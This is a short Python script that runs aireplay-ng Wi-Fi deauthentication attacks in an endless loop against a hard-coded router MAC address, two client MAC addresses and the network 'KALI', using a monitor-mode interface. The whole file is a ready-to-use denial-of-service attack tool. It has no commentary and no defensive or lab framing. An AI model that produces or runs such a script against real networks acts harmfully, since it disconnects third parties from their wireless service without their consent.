from os import system
from time import sleep

ROUTER_MAC = 'B0:4E:26:60:2C:86'
CLIENT_MAC = ['C0:11:73:C7:2A:58','64:5A:04:52:CF:C0']
INTERFACE = 'wlp0s18f2u3mon'
ESSID = 'KALI'


def deauth():
    while True:
        for x in CLIENT_MAC:
            system('aireplay-ng -0 2 -a {} -c {} -e {} {}'.format(ROUTER_MAC, x, ESSID, INTERFACE))
            sleep(3)

deauth()
